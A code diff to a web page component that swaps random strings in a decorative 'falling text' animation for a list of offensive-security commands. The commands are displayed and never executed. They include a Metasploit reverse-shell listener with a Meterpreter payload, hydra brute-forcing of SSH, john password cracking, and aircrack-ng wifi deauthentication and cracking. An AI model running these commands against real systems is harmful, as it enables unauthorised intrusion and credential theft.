@@ -111,9 +111,32 @@ const Index = () => {
     fallingTextContainer.className = "falling-text";
     document.body.appendChild(fallingTextContainer);
 
+    const linuxCommands = [
+      "sudo apt-get update",
+      "sudo apt-get upgrade",
+      "sudo apt-get install nmap",
+      "nmap -sV -p 1-65535 localhost",
+      "sudo apt-get install metasploit-framework",
+      "msfconsole",
+      "use exploit/multi/handler",
+      "set payload windows/meterpreter/reverse_tcp",
+      "set LHOST 192.168.1.100",
+      "set LPORT 4444",
+      "exploit",
+      "sudo apt-get install john",
+      "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+      "sudo apt-get install hydra",
+      "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh",
+      "sudo apt-get install aircrack-ng",
+      "airmon-ng start wlan0",
+      "airodump-ng wlan0mon",
+      "aireplay-ng --deauth 10 -a [router BSSID] wlan0mon",
+      "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [router BSSID] capturefile.cap",
+    ];
+
     const createFallingText = () => {
       const span = document.createElement("span");
-      span.textContent = Math.random().toString(36).substring(2, 15);
+      span.textContent = linuxCommands[Math.floor(Math.random() * linuxCommands.length)];
       span.style.left = `${Math.random() * 100}vw`;
       span.style.animationDuration = `${Math.random() * 5 + 5}s`;
       fallingTextContainer.appendChild(span);
